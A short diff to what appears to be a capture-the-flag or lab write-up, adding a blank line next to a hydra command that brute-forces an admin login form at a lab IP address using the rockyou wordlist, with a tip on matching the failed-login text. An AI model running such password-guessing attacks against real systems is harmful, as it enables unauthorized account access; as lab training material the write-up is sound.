@@ -34,6 +34,7 @@ Then we launch out brute force attack.
 ![image](https://user-images.githubusercontent.com/71237545/115155459-0c593c00-a04e-11eb-9811-9a613af62439.png)
 
 ```hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.79.84 http-form-post "/admin/:user=^USER^&pass=^PASS^&form=%2F&Submit=Sign+in:invalid"```
+
 Note: you have to be aware the "invalid" text at the end is based on the response you get from the site in case of a bad login.
 
 Output of Hydra:
